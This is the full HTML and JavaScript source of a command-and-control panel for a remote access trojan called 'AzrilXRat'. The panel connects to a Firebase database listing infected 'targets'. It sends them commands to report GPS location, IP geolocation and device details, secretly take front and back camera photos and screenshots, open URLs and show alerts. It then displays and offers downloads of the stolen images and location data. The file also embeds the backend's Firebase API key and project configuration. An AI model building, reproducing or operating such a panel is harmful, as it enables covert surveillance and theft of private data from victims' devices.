<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AzrilXRat | C2 Panel</title>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
<script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono:wght@400;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<script>tailwind.config={theme:{extend:{fontFamily:{mono:['Ubuntu Mono','monospace'],sans:['Space Grotesk','system-ui','sans-serif']}}}}</script>

<style>
::-webkit-scrollbar{display:none}
body{font-family:'Space Grotesk',sans-serif;background:#181818;color:#e5e7eb;letter-spacing:.02em;min-height:100vh;position:relative}
body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(255,255,255,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.02) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}

#nav{position:fixed;top:0;left:0;right:0;z-index:50;transition:all .3s;padding:16px 28px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid transparent}
#nav.scrolled{background:rgba(24,24,24,.85);backdrop-filter:blur(16px);border-bottom:1px solid #2E2E2E}
.nav-logo{font-weight:700;font-size:15px;color:#fff;display:flex;align-items:center;gap:8px}
.nav-pill{display:flex;align-items:center;gap:6px;font-family:'Ubuntu Mono',monospace;font-size:10px;color:#888;letter-spacing:.06em;text-transform:uppercase;border:1px solid #2E2E2E;padding:5px 14px;border-radius:999px;transition:all .2s}
.dot{width:5px;height:5px;border-radius:50%;background:#4ade80;animation:pulse 2s ease-in-out infinite}
.dot.off{background:#f87171;animation:none}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.15}}

.wrap{max-width:1200px;margin:0 auto;padding:90px 20px 40px;position:relative;z-index:1}

.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:16px}
.stat-card{background:#212121;border:1px solid #2E2E2E;border-radius:16px;padding:18px 20px;transition:all .3s;position:relative;overflow:hidden}
.stat-card:hover{border-color:#383838}
.stat-card::after{content:'';position:absolute;bottom:-20px;right:-20px;font-size:80px;opacity:.04;font-family:'Font Awesome 6 Free';font-weight:900}
.stat-card:nth-child(1)::after{content:'\f233'}
.stat-card:nth-child(2)::after{content:'\f120'}
.stat-card:nth-child(3)::after{content:'\f1c0'}
.stat-card:nth-child(4)::after{content:'\f017'}
.stat-label{font-family:'Ubuntu Mono',monospace;font-size:9px;color:#666;letter-spacing:.1em;text-transform:uppercase;margin-bottom:6px;display:flex;align-items:center;gap:6px}
.stat-val{font-size:22px;font-weight:600;color:#fff}

.main-grid{display:grid;grid-template-columns:260px 1fr;gap:10px}
.sidebar{background:#212121;border:1px solid #2E2E2E;border-radius:18px;overflow:hidden;max-height:68vh}
.side-hd{padding:16px 18px;border-bottom:1px solid #2E2E2E;font-family:'Ubuntu Mono',monospace;font-size:9.5px;color:#888;letter-spacing:.08em;text-transform:uppercase;display:flex;align-items:center;justify-content:space-between}
.side-count{font-family:'Ubuntu Mono',monospace;font-size:10px;color:#4ade80;background:rgba(74,222,128,.06);padding:3px 12px;border-radius:999px;border:1px solid rgba(74,222,128,.15)}
.side-list{overflow-y:auto;max-height:58vh}
.side-item{padding:12px 18px;border-bottom:1px solid #1a1a1a;cursor:pointer;transition:all .2s;display:flex;align-items:center;gap:10px}
.side-item:hover{background:#1a1a1a}
.side-item.sel{background:#111;border-left:2px solid #4ade80}
.side-dot{width:6px;height:6px;border-radius:50%;background:#4ade80;flex-shrink:0}
.side-dot.off{background:#2a2a2a}
.side-name{font-size:11px;color:#ccc;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.side-model{font-family:'Ubuntu Mono',monospace;font-size:8px;color:#555}

.control{background:#212121;border:1px solid #2E2E2E;border-radius:18px;overflow:hidden}
.ctrl-hd{padding:16px 20px;border-bottom:1px solid #2E2E2E;display:flex;align-items:center;justify-content:space-between}
.ctrl-title{font-size:12px;font-weight:500;color:#aaa;display:flex;align-items:center;gap:8px}
.ctrl-id{font-family:'Ubuntu Mono',monospace;font-size:9px;color:#666;background:#111;padding:4px 12px;border-radius:999px;border:1px solid #2E2E2E}

.action-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px;padding:16px}
.action-card{border:1px solid #2E2E2E;border-radius:14px;padding:16px;cursor:pointer;transition:all .25s;background:#1a1a1a;text-align:center;position:relative;overflow:hidden}
.action-card:hover{border-color:#444;background:#222;transform:translateY(-1px)}
.action-card.flash{border-color:#4ade80!important;background:#0a1a0a!important;animation:flashIn .5s ease-out}
@keyframes flashIn{0%{opacity:.4;transform:scale(.96)}100%{opacity:1;transform:scale(1)}}
.action-icon{font-size:20px;display:block;margin-bottom:6px}
.action-label{font-size:10px;font-weight:500;color:#999}
.card-input{background:#111;border:1px solid #2E2E2E;color:#bbb;padding:5px 8px;border-radius:6px;font-size:9px;width:100%;margin-top:6px;font-family:'Ubuntu Mono',monospace}
.card-btn{background:#111;border:1px solid #2E2E2E;color:#888;padding:4px 10px;border-radius:6px;font-size:9px;margin-top:5px;cursor:pointer;width:100%;transition:all .2s;font-family:'Space Grotesk',sans-serif}
.card-btn:hover{background:#222;color:#fff;border-color:#444}

.console-wrap{border-top:1px solid #2E2E2E;padding:16px 20px}
.console-hd{font-family:'Ubuntu Mono',monospace;font-size:9px;color:#555;letter-spacing:.08em;text-transform:uppercase;margin-bottom:8px;display:flex;align-items:center;gap:6px}
.console-box{background:#111;border:1px solid #2E2E2E;border-radius:10px;padding:12px;height:150px;overflow-y:auto;font-family:'Ubuntu Mono',monospace;font-size:9px;line-height:1.7;color:#666}
.console-box .lgr{color:#4ade80}.console-box .lgs{color:#facc15}.console-box .lge{color:#f87171}.console-box .lgb{color:#60a5fa}

.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.88);backdrop-filter:blur(12px);z-index:100;display:flex;align-items:center;justify-content:center;padding:20px}
.modal-box{background:#212121;border:1px solid #2E2E2E;border-radius:20px;padding:0;min-width:480px;max-width:94vw;max-height:85vh;overflow:hidden;animation:modalIn .3s cubic-bezier(.16,1,.3,1)}
@keyframes modalIn{0%{opacity:0;transform:scale(.9) translateY(20px)}100%{opacity:1;transform:scale(1) translateY(0)}}
.modal-header{background:#1a1a1a;border-bottom:1px solid #2E2E2E;padding:18px 22px;display:flex;align-items:center;gap:12px}
.modal-icon-wrap{width:42px;height:42px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:17px}
.modal-icon-wrap.gps{background:rgba(74,222,128,.1);color:#4ade80}
.modal-icon-wrap.globe{background:rgba(96,165,250,.1);color:#60a5fa}
.modal-icon-wrap.device{background:rgba(251,146,60,.1);color:#fb923c}
.modal-icon-wrap.camera{background:rgba(244,114,182,.1);color:#f472b6}
.modal-icon-wrap.default{background:rgba(148,163,184,.1);color:#94a3b8}
.modal-title-text{font-size:14px;font-weight:600;color:#fff}
.modal-subtitle{font-size:9px;color:#666;font-family:'Ubuntu Mono',monospace}
.modal-body{padding:20px 22px;max-height:50vh;overflow-y:auto}
.data-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #1a1a1a}
.data-row:last-child{border-bottom:none}
.data-label{font-size:10px;color:#888;font-family:'Ubuntu Mono',monospace;text-transform:uppercase;letter-spacing:.06em}
.data-value{font-size:11px;color:#ddd;font-weight:500;text-align:right;max-width:60%;word-break:break-all}
.data-value.link{color:#60a5fa;cursor:pointer;transition:all .2s}
.data-value.link:hover{text-decoration:underline}
.modal-footer{border-top:1px solid #2E2E2E;padding:14px 22px;display:flex;gap:8px}
.modal-btn{flex:1;padding:11px;border-radius:10px;font-family:'Space Grotesk',sans-serif;font-size:11px;font-weight:500;cursor:pointer;transition:all .2s;text-align:center}
.modal-btn.close{background:transparent;border:1px solid #2E2E2E;color:#888}
.modal-btn.close:hover{background:#1a1a1a;color:#fff}
.modal-btn.copy{background:#1a1a1a;border:1px solid #333;color:#aaa}
.modal-btn.copy:hover{background:#222;color:#fff}
.modal-btn.download{background:rgba(74,222,128,.08);border:1px solid rgba(74,222,128,.2);color:#4ade80}
.modal-btn.download:hover{background:rgba(74,222,128,.15)}
.preview-img{width:100%;border-radius:12px;margin-top:8px;cursor:pointer;border:1px solid #2E2E2E}
.map-link{display:block;background:rgba(96,165,250,.06);border:1px solid rgba(96,165,250,.15);border-radius:10px;padding:12px;color:#60a5fa;text-align:center;font-size:11px;cursor:pointer;margin-top:8px;transition:all .2s;font-weight:500}
.map-link:hover{background:rgba(96,165,250,.12)}

.toast{position:fixed;bottom:24px;right:24px;z-index:200;background:#212121;border:1px solid #4ade80;color:#4ade80;font-family:'Ubuntu Mono',monospace;font-size:10px;padding:10px 20px;border-radius:999px;opacity:0;transform:translateY(10px);transition:all .35s;pointer-events:none}
.toast.show{opacity:1;transform:translateY(0)}
.toast.err{border-color:#f87171;color:#f87171}

@media(max-width:768px){.main-grid{grid-template-columns:1fr}.sidebar{max-height:160px}.action-grid{grid-template-columns:1fr 1fr}.modal-box{min-width:auto;max-width:96vw}.stats-grid{grid-template-columns:1fr 1fr}}
</style>
</head>
<body>

<nav id="nav"><div class="nav-logo"><i class="fas fa-skull" style="color:#666"></i> AzrilXRat<span style="color:#444;font-weight:400">.panel</span></div><div class="nav-pill"><span class="dot" id="statusDot"></span><span id="statusText">INIT</span></div></nav>

<div class="wrap">
  <div class="stats-grid">
    <div class="stat-card"><p class="stat-label"><i class="fas fa-circle-nodes" style="color:#4ade80"></i> Online Devices</p><p class="stat-val" id="stOnline">0</p></div>
    <div class="stat-card"><p class="stat-label"><i class="fas fa-terminal" style="color:#60a5fa"></i> Commands</p><p class="stat-val" id="stCmds">0</p></div>
    <div class="stat-card"><p class="stat-label"><i class="fas fa-database" style="color:#facc15"></i> Data Size</p><p class="stat-val" id="stData">0 KB</p></div>
    <div class="stat-card"><p class="stat-label"><i class="fas fa-clock" style="color:#c084fc"></i> Uptime</p><p class="stat-val" id="stUptime">00:00</p></div>
  </div>

  <div class="main-grid">
    <div class="sidebar"><div class="side-hd"><span><i class="fas fa-laptop-code" style="color:#888"></i> Targets</span><span class="side-count" id="sideCount">0</span></div><div class="side-list" id="sideList"><div class="side-item" style="color:#555;justify-content:center;padding:24px">Waiting...</div></div></div>

    <div class="control">
      <div class="ctrl-hd"><span class="ctrl-title"><i class="fas fa-bolt" style="color:#facc15"></i> Command Center</span><span class="ctrl-id" id="ctrlDevId">Select device</span></div>
      <div class="action-grid">
        <div class="action-card" onclick="sendCmd('GET_GPS')"><span class="action-icon" style="color:#4ade80"><i class="fas fa-location-crosshairs"></i></span><p class="action-label">GPS Location</p></div>
        <div class="action-card" onclick="sendCmd('GET_IP_GEO')"><span class="action-icon" style="color:#60a5fa"><i class="fas fa-globe"></i></span><p class="action-label">IP Geolocation</p></div>
        <div class="action-card" onclick="sendCmd('GET_DEVICE_INFO')"><span class="action-icon" style="color:#fb923c"><i class="fas fa-mobile-screen"></i></span><p class="action-label">Device Info</p></div>
        <div class="action-card" onclick="sendCmd('CAMERA_FRONT_BACK')"><span class="action-icon" style="color:#f472b6"><i class="fas fa-camera-retro"></i></span><p class="action-label">Camera</p></div>
        <div class="action-card" onclick="sendCmd('SCREENSHOT')"><span class="action-icon" style="color:#818cf8"><i class="fas fa-desktop"></i></span><p class="action-label">Screenshot</p></div>
        <div class="action-card"><span class="action-icon" style="color:#38bdf8"><i class="fas fa-arrow-up-right-from-square"></i></span><p class="action-label">Open URL</p><input class="card-input" id="urlIn" placeholder="https://..." onclick="event.stopPropagation()"><button class="card-btn" onclick="event.stopPropagation();sendCmd('OPEN_URL:'+document.getElementById('urlIn').value)">SEND</button></div>
        <div class="action-card"><span class="action-icon" style="color:#fbbf24"><i class="fas fa-triangle-exclamation"></i></span><p class="action-label">Alert</p><input class="card-input" id="alertIn" placeholder="Message..." onclick="event.stopPropagation()"><button class="card-btn" onclick="event.stopPropagation();sendCmd('ALERT:'+document.getElementById('alertIn').value)">SEND</button></div>
      </div>
      <div class="console-wrap"><div class="console-hd"><i class="fas fa-code" style="color:#555"></i> Console</div><div class="console-box" id="consoleBox"><span style="color:#444">[System] Panel Ready</span></div></div>
    </div>
  </div>
</div>

<div class="modal-overlay" id="modalOverlay" style="display:none" onclick="closeModal()"><div class="modal-box" onclick="event.stopPropagation()"><div class="modal-header"><div class="modal-icon-wrap default" id="modalIcon"><i class="fas fa-info-circle"></i></div><div><div class="modal-title-text" id="modalTitle">Result</div><div class="modal-subtitle" id="modalSubtitle"></div></div></div><div class="modal-body" id="modalBody"></div><div class="modal-footer"><button class="modal-btn copy" onclick="copyResult()"><i class="fas fa-copy"></i> Copy</button><button class="modal-btn close" onclick="closeModal()"><i class="fas fa-xmark"></i> Close</button></div></div></div>

<div class="toast" id="toast"></div>

<script>
const FB={apiKey:"AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",authDomain:"krynodexrat.firebaseapp.com",databaseURL:"https://krynodexrat-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"krynodexrat",storageBucket:"krynodexrat.firebasestorage.app",messagingSenderId:"465327768431",appId:"1:465327768431:web:3e5871b9f80dcbcad1de9a"};
firebase.initializeApp(FB);
const db=firebase.database(),devicesRef=db.ref('devices'),commandsRef=db.ref('commands'),dataRef=db.ref('collected_data');
let selectedDevice=null,devices={},cmdCount=0,dataSize=0,startTime=Date.now(),lastResult=null;

setInterval(()=>{const e=Math.floor((Date.now()-startTime)/1000);document.getElementById('stUptime').textContent=Math.floor(e/60).toString().padStart(2,'0')+':'+(e%60).toString().padStart(2,'0')},1000);
db.ref('.info/connected').on('value',s=>{const d=document.getElementById('statusDot'),t=document.getElementById('statusText');if(s.val()){d.classList.remove('off');t.textContent='CONNECTED'}else{d.classList.add('off');t.textContent='DISCONNECTED'}});
window.addEventListener('scroll',()=>document.getElementById('nav').classList.toggle('scrolled',scrollY>30),{passive:true});

let toastTimer;function showToast(m,e){clearTimeout(toastTimer);const t=document.getElementById('toast');t.textContent=m;t.className='toast'+(e?' err':'')+' show';toastTimer=setTimeout(()=>t.classList.remove('show'),2200)}

devicesRef.on('child_added',s=>{const d=s.val();d.id=s.key;devices[s.key]=d;renderDeviceList();log('[+] '+s.key.substring(0,10),'lgr')});
devicesRef.on('child_changed',s=>{devices[s.key]={...devices[s.key],...s.val()};renderDeviceList()});
devicesRef.on('child_removed',s=>{delete devices[s.key];if(selectedDevice===s.key){selectedDevice=null;document.getElementById('ctrlDevId').textContent='Select device'}renderDeviceList();log('[-] '+s.key.substring(0,10),'lge')});

dataRef.on('child_added',s=>{const r=s.val();if(!r)return;cmdCount++;dataSize+=JSON.stringify(r).length;document.getElementById('stCmds').textContent=cmdCount;document.getElementById('stData').textContent=(dataSize/1024).toFixed(1)+' KB';log('[←] '+r.type,'lgb');lastResult=r;showResultModal(r);s.ref.remove()});

function renderDeviceList(){const ids=Object.keys(devices);document.getElementById('stOnline').textContent=ids.length;document.getElementById('sideCount').textContent=ids.length;if(!ids.length){document.getElementById('sideList').innerHTML='<div class="side-item" style="color:#555;justify-content:center;padding:24px">Waiting for targets...</div>';return}document.getElementById('sideList').innerHTML=ids.map(id=>{const d=devices[id],sel=selectedDevice===id?' sel':'',off=(Date.now()-d.lastSeen)>30000;return`<div class="side-item${sel}" onclick="selectDevice('${id}')"><span class="side-dot${off?' off':''}"></span><span class="side-name">${id.substring(0,9)}...</span><span class="side-model">${d.model||'?'}</span></div>`}).join('')}
function selectDevice(id){selectedDevice=id;document.getElementById('ctrlDevId').textContent=id.substring(0,18)+'...';renderDeviceList();log('[>] '+id.substring(0,9),'lgs')}
function sendCmd(cmd){if(!selectedDevice){showToast('Select device first',true);return}commandsRef.child(selectedDevice).push({command:cmd,timestamp:Date.now(),status:'pending'});log('[→] '+cmd,'lgs');showToast(cmd);document.querySelectorAll('.action-card').forEach(c=>{c.classList.add('flash');setTimeout(()=>c.classList.remove('flash'),400)})}
function log(m,c=''){const t=new Date().toLocaleTimeString(),b=document.getElementById('consoleBox');b.innerHTML+=`<br><span class="${c}">[${t}] ${m}</span>`;b.scrollTop=b.scrollHeight}

function showResultModal(r){
  const typeMap={GET_GPS:'gps',GET_IP_GEO:'globe',GET_DEVICE_INFO:'device',CAMERA_FRONT_BACK:'camera',SCREENSHOT:'camera'};
  const iconMap={gps:'<i class="fas fa-location-crosshairs"></i>',globe:'<i class="fas fa-globe"></i>',device:'<i class="fas fa-mobile-screen"></i>',camera:'<i class="fas fa-camera-retro"></i>',default:'<i class="fas fa-info-circle"></i>'};
  const ic=typeMap[r.type]||'default';
  document.getElementById('modalIcon').className='modal-icon-wrap '+ic;
  document.getElementById('modalIcon').innerHTML=iconMap[ic];
  document.getElementById('modalTitle').textContent=r.type.replace(/_/g,' ');
  document.getElementById('modalSubtitle').textContent=new Date(r.timestamp).toLocaleString();
  
  const d=r.data||r;let h='';let dlBtns='';
  if(d.error){h=`<div style="color:#f87171;padding:12px;background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:10px;font-size:11px"><i class="fas fa-circle-exclamation"></i> ${d.error}</div>`}
  else{
    for(const[k,v]of Object.entries(d)){
      if((k==='frontPhoto'||k==='backPhoto'||k==='screenshotUrl')&&v){
        const label=k==='frontPhoto'?'Front Camera':k==='backPhoto'?'Back Camera':'Screenshot';
        h+=`<div class="data-row"><span class="data-label">${label}</span></div>`;
        h+=`<img src="${v}" class="preview-img" onclick="window.open('${v}')" onerror="this.style.display='none'" loading="lazy">`;
        dlBtns+=`<button class="modal-btn download" onclick="window.open('${v}')"><i class="fas fa-download"></i> Download ${label}</button>`;
        continue;
      }
      if(k==='maps'&&v){h+=`<div class="map-link" onclick="window.open('${v}')"><i class="fas fa-map-marker-alt"></i> Open in Google Maps</div>`;continue}
      if(k==='address'&&v){h+=`<div class="data-row"><span class="data-label">Address</span><span class="data-value">${v}</span></div>`;continue}
      if(typeof v!=='object'){h+=`<div class="data-row"><span class="data-label">${k}</span><span class="data-value">${v}</span></div>`}
    }
  }
  document.getElementById('modalBody').innerHTML=h||'<div style="color:#666;text-align:center;padding:20px">No data received</div>';
  const footer=document.querySelector('.modal-footer');
  footer.innerHTML=(dlBtns?dlBtns:'')+'<button class="modal-btn copy" onclick="copyResult()"><i class="fas fa-copy"></i> Copy</button><button class="modal-btn close" onclick="closeModal()"><i class="fas fa-xmark"></i> Close</button>';
  document.getElementById('modalOverlay').style.display='flex';
}

function closeModal(){document.getElementById('modalOverlay').style.display='none'}
function copyResult(){if(lastResult){navigator.clipboard.writeText(JSON.stringify(lastResult,null,2));showToast('Copied!')}}

setInterval(()=>{let removed=0;Object.keys(devices).forEach(id=>{if((Date.now()-devices[id].lastSeen)>3600000){devicesRef.child(id).remove();removed++}});if(removed>0)log('[AUTO] Cleaned '+removed+' offline','lge')},60000);
log('Panel Ready');
</script>
</body>
</html>
